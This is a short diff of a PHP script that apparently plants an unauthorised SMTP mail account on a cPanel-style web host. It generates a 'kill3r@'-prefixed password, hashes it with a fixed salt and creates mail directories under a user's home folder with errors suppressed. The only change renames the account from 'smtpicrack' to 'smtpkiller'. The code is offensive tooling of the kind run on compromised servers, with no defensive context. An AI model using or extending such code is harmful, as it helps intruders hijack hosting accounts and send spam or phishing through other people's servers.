@@ -32,7 +32,7 @@ if (empty($usr)) {
 	if (is_dir($cp)) {
 		$pass = "kill3r@".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
 		$pwd=crypt($pass,'$6$roottn$');
-		$smtpname = 'smtpicrack';
+		$smtpname = 'smtpkiller';
 		@mkdir("/home$home$usr/etc/$domain");
 		@mkdir("/home$home$usr/mail/$domain");
 		@mkdir("/home$home$usr/mail/$domain/$smtpname");
